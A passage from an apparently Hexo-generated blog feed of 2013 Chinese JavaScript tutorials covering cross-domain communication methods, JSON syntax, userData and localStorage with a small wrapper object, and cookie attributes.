target="_blank">html</a></span>中的script标签可以加载并执行其他域的JavaScript，于是我们可以通过script标记来动态加载其他域的<span class="wp_keywordlink_affiliate"><a title="资源" href="http://www.woiweb.net/category/resource" rel="nofollow" target="_blank">资源</a></span>。例如我要从域A的页面pageA加载域B的数据，那么在域B的页面pageB中我以JavaScript的形式声明pageA需要的数据，然后在pageA中用script标签把pageB加载进来，那么pageB中的脚本就会得以执行。JSONP在此基础上加入了回调函数，pageB加载完之后会执行pageA中定义的函数，所需要的数据会以参数的形式传递给该函数。JSONP易于实现，但是也会存在一些安全隐患，如果第三方的脚本随意地执行，那么它就可以篡改页面内容，截获敏感数据。但是在受信任的双方传递数据，JSONP是非常合适的选择。</p><h4><span class="wp_keywordlink_affiliate"><a title="flash" href="http://www.woiweb.net/tag/flash" rel="nofollow" target="_blank">flash</a></span> <strong>URLLoader</strong></h4><p><span class="wp_keywordlink_affiliate"><a title="flash" href="http://www.woiweb.net/tag/flash" rel="nofollow" target="_blank">flash</a></span>有自己的一套安全策略，服务器可以通过crossdomain.xml文件来声明能被哪些域的SWF文件访问，SWF也可以通过API来确定自身能被哪些域的SWF加载。当<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>访问资源时，例如从域www.a.com请求域www.b.com上的数据，我们可以借助<span class="wp_keywordlink_affiliate"><a title="flash" href="http://www.woiweb.net/tag/flash" rel="nofollow" target="_blank">flash</a></span>来发送HTTP请求。首先，修改域www.b.com上的crossdomain.xml(一般存放在根目录，如果没有需要手动创建) ，把www.a.com加入到白名单。其次，通过Flash URLLoader发送HTTP请求，最后，通过Flash API把响应结果传递给JavaScript。Flash URLLoader是一种很普遍的<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>解决方案，不过需要支持iOS的话，这个方案就无能为力了。</p><h4><strong>Access Control</strong></h4><p>Access Control是比较超越的<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>方式，目前只在很少的浏览器中得以支持，这些浏览器可以发送一个<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>的HTTP请求（Firefox, Google Chrome等通过XMLHTTPRequest实现，IE8下通过XDomainRequest实现），请求的响应必须包含一个Access-Control-Allow-Origin的HTTP响应头，该响应头声明了请求域的可访问权限。例如www.a.com对www.b.com下的asset.php发送了一个<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>的HTTP请求，那么asset.php必须加入如下的响应头：</p><h4><strong>window.name</strong></h4><p>window对象的name属性是一个很特别的属性，当该window的location变化，然后重新加载，它的name属性可以依然保持不变。那么我们可以在页面A中用iframe加载其他域的页面B，而页面B中用JavaScript把需要传递的数据赋值给window.name，iframe加载完成之后，页面A修改iframe的地址，将其变成同域的一个地址，然后就可以读出window.name的值了。这个方式非常适合单向的数据请求，而且协议简单、安全。不会像JSONP那样不做限制地执行外部脚本。</p><h4><strong>server proxy</strong></h4><p>在数据提供方没有提供对JSONP协议或者window.name协议的支持，也没有对其它域开放访问权限时，我们可以通过server proxy的方式来抓取数据。例如当www.a.com域下的页面需要请求www.b.com下的资源文件asset.txt时，直接发送一个指向www.b.com/asset.txt的<span class="wp_keywordlink_affiliate"><a title="Ajax" href="http://www.woiweb.net/tag/ajax" rel="nofollow" target="_blank">Ajax</a></span>请求肯定是会被浏览器阻止。这时，我们在www.a.com下配一个代理，然后把<span class="wp_keywordlink_affiliate"><a title="Ajax" href="http://www.woiweb.net/tag/ajax" rel="nofollow" target="_blank">Ajax</a></span>请求绑定到这个代理路径下，例如www.a.com/proxy/, 然后这个代理发送HTTP请求访问www.b.com下的asset.txt，<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>的HTTP请求是在服务器端进行的，客户端并没有产生<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>的<span class="wp_keywordlink_affiliate"><a title="Ajax" href="http://www.woiweb.net/tag/ajax" rel="nofollow" target="_blank">Ajax</a></span>请求。这个<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>方式不需要和目标资源签订协议，带有侵略性，另外需要注意的是实践中应该对这个代理实施一定程度的保护，比如限制他人使用或者使用频率。</p><h3>双向<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a></h3><h4><strong>document.domain</strong></h4><p>通过修改document的domain属性，我们可以在域和子域或者不同的子域之间通信。同域策略认为域和子域隶属于不同的域，比如www.a.com和sub.a.com是不同的域，这时，我们无法在www.a.com下的页面中调用sub.a.com中定义的JavaScript方法。但是当我们把它们document的domain属性都修改为a.com，浏览器就会认为它们处于同一个域下，那么我们就可以互相调用对方的method来通信了。</p><h4><strong>FIM – Fragment Identitier Messaging</strong></h4><p>不同的域之间，JavaScript只能做很有限的访问和操作，其实我们利用这些有限的访问权限就可以达到<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>通信的目的了。FIM (Fragment Identitier Messaging)就是在这个大前提下被发明的。父窗口可以对iframe进行URL读写，iframe也可以读写父窗口的URL，URL有一部分被称为frag，就是#号及其后面的字符，它一般用于浏览器锚点定位，Server端并不关心这部分，应该说HTTP请求过程中不会携带frag，所以这部分的修改不会产生HTTP请求，但是会产生浏览器历史记录。FIM的原理就是改变URL的frag部分来进行双向通信。每个window通过改变其他window的location来发送消息，并通过监听自己的URL的变化来接收消息。这个方式的通信会造成一些不必要的浏览器历史记录，而且有些浏览器不支持onhashchange事件，需要轮询来获知URL的改变，最后，URL在浏览器下有长度限制，这个制约了每次传送的数据量。</p><h4><strong>Flash LocalConnection</strong></h4><p>页面上的双向通信也可以通过Flash来解决，Flash API中有LocalConnection这个类，该类允许两个SWF之间通过进程通信，这时SWF可以播放在独立的Flash Player或者AIR中，也可以嵌在<span class="wp_keywordlink_affiliate"><a title="html" href="http://www.woiweb.net/category/html_css" rel="nofollow" target="_blank">html</a></span>页面或者是PDF中。遵循这个通信原则，我们可以在不同域的HTML页面各自嵌套一个SWF来达到相互传递数据的目的了。SWF通过LocalConnection交换数据是很快的，但是每次的数据量有40kb的大小限制。用这种方式来<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>通信过于复杂，而且需要了2个SWF文件，实用性不强。</p><h4><strong>window.postMessage</strong></h4><p>window.postMessage是<span class="wp_keywordlink_affiliate"><a title="html5" href="http://www.woiweb.net/tag/html5" rel="nofollow" target="_blank">html5</a></span>定义的一个<a href="http://dev.w3.org/html5/postmsg/" target="_blank">很新的方法</a>，这个方法可以很方便地跨window通信。由于它是一个很新的方法，所以在很旧和比较旧的浏览器中都无法使用。</p><h4><strong>Cross Frame</strong></h4><p>Cross Frame是FIM的一个变种，它借助了一个空白的iframe，不会产生多余的浏览器历史记录，也不需要轮询URL的改变，在可用性和性能上都做了很大的改观。它的基本原理大致是这样的，假设在域www.a.com上有页面A.html和一个空白代理页面proxyA.html, 另一个域www.b.com上有个页面B.html和一个空白代理页面proxyB.html，A.html需要向B.html中发送消息时，页面会创建一个隐藏的iframe, iframe的src指向proxyB.html并把message作为URL frag，由于B.html和proxyB.html是同域，所以在iframe加载完成之后，B.html可以获得iframe的URL，然后解析出message，并移除该iframe。当B.html需要向A.html发送消息时，原理一样。Cross Frame是很好的双向通信方式，而且安全高效，但是它在Opera中无法使用，不过在Opera下面我们可以使用更简单的window.postMessage来代替。</p><h3>总结</h3><p><a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>的方法很多，不同的应用场景我们都可以找到一个最合适的解决方案。比如单向的数据请求，我们应该优先选择JSONP或者window.name，双向通信我们采取Cross Frame，在未与数据提供方没有达成通信协议的情况下我们也可以用server proxy的方式来抓取数据。&nbsp;</p><p>原文：http://www.woiweb.net/10-cross-domain-methods.html</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSON</title>
      <link href="/blog/2013/03/28/JSON/"/>
      <url>/blog/2013/03/28/JSON/</url>
      
        <content type="html"><![CDATA[<p><strong>JSON</strong>(JavaScript Object Notation) 是一种轻量级的数据交换格式。 易于人阅读和编写。同时也易于机器解析和生成。 它基于<a href="http://www.crockford.com/javascript">JavaScript Programming Language</a>,&nbsp;<a href="http://www.ecma-international.org/publications/files/ecma-st/ECMA-262.pdf">Standard ECMA-262 3rd Edition - December 1999</a>的一个子集。 JSON采用完全独立于语言的文本格式，但是也使用了类似于C语言家族的习惯（包括C, C++, C#, Java, JavaScript, Perl, Python等）。 这些特性使JSON成为理想的数据交换语言。</p><p>JSON建构于两种结构：</p><ul><li>\名称/值"对的集合（A collection of name/value pairs）。不同的语言中，它被理解为<em>对象（object）</em>，纪录（record），结构（struct），字典（dictionary），哈希表（hash table），有键列表（keyed list），或者关联数组 （associative array）。</li><li>值的有序列表（An ordered list of values）。在大部分语言中，它被理解为数组（array）。</li></ul><p>这些都是常见的数据结构。事实上大部分现代计算机语言都以某种形式支持它们。这使得一种数据格式在同样基于这些结构的编程语言之间交换成为可能。</p><p>JSON具有以下这些形式：</p><p>对象是一个无序的\"名称/值"对"集合。一个对象以\{"（左括号）开始，\}"（右括号）结束。每个\名称"后跟一个\:"（冒号）；\"名称/值" 对"之间使用\,"（逗号）分隔。</p><p><img src="https://json.org/object.gif" alt="" width="598" height="113"></p><p>数组是值（value）的有序集合。一个数组以\["（左中括号）开始，\]"（右中括号）结束。值之间使用\,"（逗号）分隔。</p><p><img src="https://json.org/array.gif" alt="" width="598" height="113"></p><p>值（<em>value</em>）可以是双引号括起来的字符串（<em>string</em>）、数值(number)、<code>true</code>、<code>false</code>、&nbsp;<code>null</code>、对象（object）或者数组（array）。这些结构可以嵌套。</p><p><img src="https://json.org/value.gif" alt="" width="598" height="278"></p><p>字符串（<em>string</em>）是由双引号包围的任意数量Unicode字符的集合，使用反斜线转义。一个字符（character）即一个单独的字符串（character string）。</p><p>字符串（<em>string</em>）与C或者Java的字符串非常相似。</p><p><img src="https://json.org/string.gif" alt="" width="598" height="413"></p><p>数值（<em>number</em>）也与C或者Java的数值非常相似。除去未曾使用的八进制与十六进制格式。除去一些编码细节。</p><p><img src="https://json.org/number.gif" alt="" width="598" height="266"></p><p>空白可以加入到任何符号之间。 以下描述了完整的语言。</p><p><strong>原文链接：http://json.org/json-zh.html</strong></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript本地储存（2）：userData和localStorage</title>
      <link href="/blog/2013/03/28/cb-javascript-userdata-and-localstorage/"/>
      <url>/blog/2013/03/28/cb-javascript-userdata-and-localstorage/</url>
      
        <content type="html"><![CDATA[<p>　　<a title="JavaScript本地储存（1）：cookie在前端" href="http://www.cnblogs.com/hustskyking/archive/2013/03/27/2984328.html" target="_blank">上文</a>对cookie的知识进行了归纳，同时也提到了cookie的大小是有限制的。</p><blockquote><p><span>cookie 是有大小限制的，每个 cookie 所存放的数据不能超过4kb，如果 cookie 字符串的长度超过4kb，则该属性将返回空字符串。&mdash;&mdash;<a title="JavaScript本地储存（1）：cookie在前端" href="http://www.cnblogs.com/hustskyking/archive/2013/03/27/2984328.html" target="_blank">上文</a>提要</span></p></blockquote><p>　　<span>如果我们需要在客户端储存比较大容量的数据，怎么办？下面给大家介绍userData和localStorage的基本知识和一些应用。先说明下为什么把两个东西扯到一起说，因为后面写了个对象，把UserData和localStorage包装到了一起O(&cap;_&cap;)O~</span></p><h3><span>Conception [基本概念]</span></h3><p><span>　　毫无疑问，无论是UserData还是localStorage都是储存在客户端磁盘的一段文本，但是两者也有很大的差异性。</span></p><p><strong>　　1.UserData</strong></p><p>　　单单说UserData是不太准确的，要实现本地储存得说\UserData Behavior"。</p><blockquote><p>　<span>UserData Behavior</span></p><span>&mdash;&mdash; Enables the object to persist data in user data.　　</span></blockquote><p>　　这是来自<a title="MS UserData" href="http://msdn.microsoft.com/zh-cn/vstudio/ms531424" target="_blank">微软</a>的解释。意思是允许对象在用户页面保存数据。它适用于win32和Unix的MS IE5.0版本以上平台。</p><table class="clsStd"><tbody><tr><th>Security Zone</th><th>Document Limit (KB)</th><th>Domain Limit (KB)</th></tr><tr><td>Local Machine</td><td>128</td><td>1024</td></tr><tr><td>Intranet</td><td>512</td><td>10240</td></tr><tr><td>Trusted Sites</td><td>128</td><td>1024</td></tr><tr><td>Internet</td><td>128</td><td>1024</td></tr><tr><td>Restricted</td><td>64</td><td>640</td></tr></tbody></table><p>　　上表是UserData的大小限制，也是从微软那里拷贝过来的，大家应该知道IE浏览器有可以设置安全等级</p><p><img src="https://images.cnitblog.com/blog/387325/201303/28222651-d8a98f6c104a45b2a2e3bb404811f269.png" alt="IE安全设置"></p><p>　　表格里的几个英文单词就对应着看吧，~\(≧▽≦)/~</p><p><strong>　　2.localStorage</strong></p><blockquote><p><span>Web storage is being standardized by the World Wide Web Consortium (W3C). It was originally part of the HTML 5 specification, but is now in a separate specification. It is supported by Internet Explorer 8, Mozilla-based browsers ,Safari 4, Google Chrome 4, and Opera 10.50. As of 14 March 2011 Opera and IE9 supports the storage events.</span></p></blockquote><p>　　上面一串*<%￥...是来自<a title="wiki localStorage" href="http://en.wikipedia.org/wiki/Web_storage" target="_blank">wiki</a>的说明，跟localStorage一起的还有sessionStorage，这里就只说说localStorage。上文大意（英语水平低就是可怜）：网页储存被W3C标准化，原来本属于HTML5标准的一部分，现在已经被独立出来了。它适用于IE 8+，FF 2+，Safari 4+，chrome 4+， Opera 10.50+。</p><p>　　<strong>P.S.：</strong>sessionStorage用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，仅仅是会话级别的存储。</p><p><span>　　</span>标准建议对于每个domain，localStorage大小为<strong>5M</strong>，达到限制时浏览器可以去问用户是否允许增加存储空间。</p><p>　 &nbsp; 这是<a title="test" href="http://hi.baidu.com/erik168/item/85490cce5ccb7ad9ee183bdf" target="_blank">网友</a>的对\浏览器具体能保存多少个字符"的一个测试。</p><blockquote><p><strong>测试结果：</strong></p><p>　对英文字符和中文字符来说，测试结果并无变化，所以存储格式可能为UTF16。</p><p>　以下为测试数据(key有5个字符):</p><p>　　　　IE 9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &gt;&nbsp;4999995 + 5 = 5000000</p><p>　　　　firefox&nbsp;8.0.2&nbsp;&gt;&nbsp;5242875 + 5 = 5242880</p><p>　　　　chrome &nbsp;16.0 &nbsp;&gt;&nbsp;2621435 + 5 = 2621440</p><p>　　　　safari &nbsp;5.1 &nbsp;&nbsp;&gt;&nbsp;2621435&nbsp;+ 5 = 2621440</p><p>　　　　opera &nbsp; 11.60&nbsp;&gt;&nbsp;1966068&nbsp;+ 5 = 1966073</p><p>&nbsp;</p></blockquote><h3>&nbsp;Grammar [语法介绍]</h3><p><strong>　　1.userData</strong></p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">XML       &lt;prefix: customtag=<span class="string">&quot;&quot;</span> id=<span class="string">&quot;sID&quot;</span>&gt;</span><br><span class="line">HTML     　&lt;element id=<span class="string">&quot;sID&quot;</span>&gt;</span><br><span class="line">Scripting  object .style.behavior = <span class="string">&quot;url(&#x27;<span class="subst">#<span class="keyword">default</span></span><span class="subst">#userData</span>&#x27;)&quot;</span></span><br><span class="line">object .addBehavior (<span class="string">&quot;<span class="subst">#<span class="keyword">default</span></span><span class="subst">#userData</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></element></prefix:></p><p>　　上面介绍了几种语言中userData的用法，当然这也是从<a title="MSDN UserData" href="http://msdn.microsoft.com/zh-cn/vstudio/ms531424" target="_blank">MSDN</a>拿过来的（呵呵，真心好用）。那这里我们重点放在前端常用的位置上，也就是标红了的HTML中。</p><p>　　　　1）<span><strong>属性:</strong></span></p><p><span>　　　　　　expires &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;设置或者获取 userData behavior 保存数据的失效日期。</span></p><p><span>　　　　　　XMLDocument &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;获取 XML 的引用。</span></p><p><span>　　　　2）<strong>方法:</strong></span></p><p><span>　　　　　　getAttribute() &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;获取指定的属性值。</span></p><p><span>　　　　　　load(object) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;从 userData &nbsp;存储区载入存储的对象数据。</span></p><p><span>　　　　　　removeAttribute() &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;移除对象的指定属性。</span></p><p><span>　　　　　　save(object) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 将对象数据存储到一个 userData 存储区。</span></p><p><span>　　　　　　setAttribute() &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 设置指定的属性值。</span></p><p><span>　　具体如何实现，请转到最下面封装的一个对象中~</span></p><p><strong>　　2.localStorage</strong></p><p>　　　　1）<strong>方法：</strong></p><p>　　　　　　localStorage.getItem(key) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;获取指定key本地存储的值</p><p>　　　　　　localStorage.setItem(key,value) &nbsp;将value存储到key字段</p><p>　　　　　　localStorage.removeItem(key) &nbsp; &nbsp;删除指定key本地存储的值</p><h3>Pacaking [对象封装]</h3><figure class="highlight plaintext"><figcaption><span>of userDate&&localStorage</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">localData = &#123;</span><br><span class="line">         hname:location.hostname?location.hostname:&#x27;localStatus&#x27;,</span><br><span class="line">         isLocalStorage:window.localStorage?true:false,</span><br><span class="line">         dataDom:null,</span><br><span class="line"></span><br><span class="line">         initDom:function()&#123; //初始化userData</span><br><span class="line">             if(!this.dataDom)&#123;</span><br><span class="line">                 try&#123;</span><br><span class="line">                     this.dataDom = document.createElement(&#x27;input&#x27;);//这里使用hidden的input元素</span><br><span class="line">                     this.dataDom.type = &#x27;hidden&#x27;;</span><br><span class="line">                     this.dataDom.style.display = &quot;none&quot;;</span><br><span class="line">                     this.dataDom.addBehavior(&#x27;#default#userData&#x27;);//这是userData的语法</span><br><span class="line">                     document.body.appendChild(this.dataDom);</span><br><span class="line">                     var exDate = new Date();</span><br><span class="line">                     exDate = exDate.getDate()+30;</span><br><span class="line">                     this.dataDom.expires = exDate.toUTCString();//设定过期时间</span><br><span class="line">                 &#125;catch(ex)&#123;</span><br><span class="line">                     return false;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             return true;</span><br><span class="line">         &#125;,</span><br><span class="line">         set:function(key,value)&#123;</span><br><span class="line">             if(this.isLocalStorage)&#123;</span><br><span class="line">                 window.localStorage.setItem(key,value);</span><br><span class="line">             &#125;else&#123;</span><br><span class="line">                 if(this.initDom())&#123;</span><br><span class="line">                     this.dataDom.load(this.hname);</span><br><span class="line">                     this.dataDom.setAttribute(key,value);</span><br><span class="line">                     this.dataDom.save(this.hname)</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;,</span><br><span class="line">         get:function(key)&#123;</span><br><span class="line">             if(this.isLocalStorage)&#123;</span><br><span class="line">                 return window.localStorage.getItem(key);</span><br><span class="line">             &#125;else&#123;</span><br><span class="line">                 if(this.initDom())&#123;</span><br><span class="line">                     this.dataDom.load(this.hname);</span><br><span class="line">                     return this.dataDom.getAttribute(key);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;,</span><br><span class="line">         remove:function(key)&#123;</span><br><span class="line">             if(this.isLocalStorage)&#123;</span><br><span class="line">                 localStorage.removeItem(key);</span><br><span class="line">             &#125;else&#123;</span><br><span class="line">                 if(this.initDom())&#123;</span><br><span class="line">                     this.dataDom.load(this.hname);</span><br><span class="line">                     this.dataDom.removeAttribute(key);</span><br><span class="line">                     this.dataDom.save(this.hname)</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>Usage [使用说明]</h3><p>　　<strong>1.初始化</strong></p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">localData.initDom()<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　<strong>2.设置 key/value</strong></p><figure class="highlight q"><table><tr><td class="code"><pre><span class="line">localData.<span class="built_in">set</span>(<span class="built_in">key</span>, <span class="built_in">value</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　<strong>3.获取 value</strong></p><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">localData.<span class="built_in">get</span>(<span class="built_in">key</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　<strong>4.删除</strong></p><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">localData.<span class="built_in">remove</span>(<span class="built_in">key</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>Attention [注意事项]</h3><p>　　1.localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。</p><p>　　2.出于安全原因，只有在同一个目录和相同的协议下才能进行持久化存储。数据是未加密的，建议你不要保存过于隐私的信息。</p><p>下文将对<a title="web离线" href="http://www.cnblogs.com/hustskyking/archive/2013/03/30/javascript-applicationcache.html" target="_blank">web离线</a>作具体介绍。</p><h3>Related blog [相关博文]</h3><p>　　<a class="titlelink" href="http://www.cnblogs.com/hustskyking/archive/2013/03/27/javascript-cookie.html">JavaScript本地储存（1）：cookie在前端</a><span>&nbsp;</span></p><p>　　<a class="titlelink" href="http://www.cnblogs.com/hustskyking/archive/2013/03/30/javascript-applicationcache.html">Javascript本地储存（3）：离线web应用</a></p><h3>Reference [参考资料]</h3><p>　　1.<a title="wiki localStorage" href="http://en.wikipedia.org/wiki/Web_storage" target="_blank">wiki</a></p><p>　　2.<a title="MSDN UserData" href="http://msdn.microsoft.com/zh-cn/vstudio/ms531424" target="_blank">MSDN</a></p><p>　　3.<a title="beiYuu博客" href="http://www.cnblogs.com/beiyuu/archive/2011/07/20/js-localstorage-userdata.html" target="_blank">BeiYuu博客</a></p><p>　　4.<a title="test" href="http://hi.baidu.com/erik168/item/85490cce5ccb7ad9ee183bdf" target="_blank">网友</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript本地储存（1）：cookie在前端</title>
      <link href="/blog/2013/03/27/cb-javascript-cookie/"/>
      <url>/blog/2013/03/27/cb-javascript-cookie/</url>
      
        <content type="html"><![CDATA[<style><!--.tbArg{}  .tbArg td { padding:2px;}.tbArg tr:nth-child(2n) { background:#eee}.tbArg tr:first { font-size:16px;}--></style><p>　　以前心里总是默念着这句：\知道资源在哪儿就是成功的一半"。对于很多知识的学习，好像也一直停留在知道它在哪儿的地步，看来现在需要有所改变了！</p><p>　　<strong>那就从cookie开始吧~</strong></p><blockquote><p>　　<strong>Cookie</strong><span>（复数形态Cookies），中文名称为</span><strong>小型文本文件</strong><span>或</span><strong>小甜饼</strong><sup id="cite_ref-1" class="reference"></sup><span>，指某些</span>网站<span>为了辨别用户身份、<span>进行session跟踪</span>而储存在用户本地终端（Client Side）上的数据（通常经过</span>加密<span>）。定义于RFC2109（已废弃），最新取代的规范是<a title="rfc2965.txt" href="http://www.ietf.org/rfc/rfc2965.txt" target="_blank">RFC2965</a>。</span></p></blockquote><h3>Clasification [分类]</h3><p>　　说到底，cookie就是保存在客户端的一段<strong>字符串</strong>（注意：不是数组）。</p><p>　　cookie可以手动设置，也可以由服务器产生，当客户端（浏览器）向服务器发送请求，服务器会反馈一些信息给客户端，这些信息的key/value值被浏览器作为文件保存在客户端特定的文件夹中。</p><p>　　<strong>1.内存Cookie</strong></p><p>　　　　<span>内存Cookie由</span>浏览器<span>维护，保存在</span>内存<span>中，浏览器关闭后就消失了，其存在时间是短暂的。</span></p><p><span>　　<strong>2.磁盘Cookie</strong></span></p><p>&nbsp;　　　&nbsp;<span>硬盘Cookie保存在</span>硬盘<span>里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除，其存在时间是长期的。</span></p><h3>Arguments [参数]</h3><table class="tbarg" border="1" cellspacing="5" cellpadding="5"><caption>&nbsp;</caption><tbody><tr><td width="120"><span><strong>属&nbsp; 性&nbsp; 名</strong></span></td><td><span><strong>描&nbsp;&nbsp;&nbsp; 述</strong></span></td></tr><tr><td><span>String name</span></td><td><span>该Cookie的名称。Cookie一旦创建，名称便不可更改</span></td></tr><tr><td><span>Object value</span></td><td><span>该Cookie的值。如果值为Unicode字符，需要为字符编码。如果值为二进制数据，则需要使用BASE64编码</span></td></tr><tr><td><span>int maxAge</span></td><td><span>该Cookie失效的时间，单位秒。如果为正数，则该Cookie在maxAge秒之后失效。如果为负数，该Cookie为临时Cookie，关闭浏览器即失效，浏览器也不会以任何形式保存该Cookie。如果为0，表示删除该Cookie。默认为–1</span></td></tr><tr><td><span>boolean secure</span></td><td><span>该Cookie是否仅被使用安全协议传输。安全协议。安全协议有HTTPS，SSL等，在网络上传输数据之前先将数据加密。默认为false</span></td></tr><tr><td><span>String path</span></td><td><span>该Cookie的使用路径。如果设置为\/sessionWeb/"，则只有contextPath为\/sessionWeb"的程序可以访问该Cookie。如果设置为\/"，则本域名下contextPath都可以访问该Cookie。注意最后一个字符必须为\/"</span></td></tr><tr><td><span>String domain</span></td><td><span>可以访问该Cookie的域名。如果设置为\.google.com"，则所有以\google.com"结尾的域名都可以访问该Cookie。注意第一个字符必须为\."</span></td></tr><tr><td><span>String comment</span></td><td><span>该Cookie的用处说明。浏览器显示Cookie信息的时候显示该说明</span></td></tr><tr><td><span>int version</span></td><td><span>该Cookie使用的版本号。0表示遵循Netscape的Cookie规范，1表示遵循W3C的RFC 2109规范</span></td></tr></tbody></table><h3>Detail [参数详解]</h3><p>　　<strong>1。key/value</strong></p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>document.cookie  = <span class="comment">&#x27;username=木子Vs立青&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　很简单吧，cookie是document的一个属性，在控制台，console.log(document.cookie)可以看到该域名下的cookie值。设置方式就是<strong>key=value</strong>.</p><p>　　如何已经存在了username这个key，再次如上操作就是修改value值了。</p><p>　　<strong>2.maxAge</strong></p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>var date = <span class="keyword">new</span> Date();</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="symbol">3 </span>date.setDate(date.getDate()+<span class="number">30</span>);</span><br><span class="line"><span class="symbol">4 </span>date.toGMTString();</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="symbol">6 </span>document.cookie = <span class="string">&quot;name=value;expires=date&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　expires这个参数是用来设置cookie有效期的，如果将expires设置成一个过去的时间（相对本机系统时间），相应的cookie就被删除，当然也可以手动来删除cookie~</p><p>　　上面给出的例子是以天为单位计算的，如果要改成其他的计时方式，可以修改第三行date.setDate(date.getDate()+30)，为30天。比如要改成按小时计算：date.setHours(date.getHours()+30)，为30小时。</p><p>　　<strong>3.path</strong></p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>document.cookie = <span class="string">&quot;name=value;expires=date;path=path&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;　　这里的path如何理解？比如在http://www.cnblogs.com/hustskyking/下创建一个cookie（即path=/hustskyking/），那么在http://www.cnblogs.com/hustskyking/下所有子目录都是可以访问这个cookie的；再比如path=/，意思就是在http://www.cnblogs.com/下的任何子目录都是访问到这个cookie的。</p><p>　　<strong>4.domain</strong></p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>document.cookie = <span class="string">&quot;name=value;path=path;expires=date;domain=domain&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　这里要说的是同域访问，比如在a.example.com和b.example.com下共享c.example.com下的cookie文件，只需如此这般...</p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>document.cookie = <span class="string">&quot;name=value;path=path;expires=date;domain=example.com&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　你应该懂了~</p><p>　　<strong>5.secure</strong></p><p>&nbsp;　　我们知道在网络中建立连接传输数据有两种常见的方式，一个钟是http，另一种是https，后者是加密传输。大家从上面也可以看出，cookie很容易被窃取，通过下面这个方式可以为cookie加一把安全锁。</p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>document.cookie = <span class="string">&quot;username=木子Vs立青;secure&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　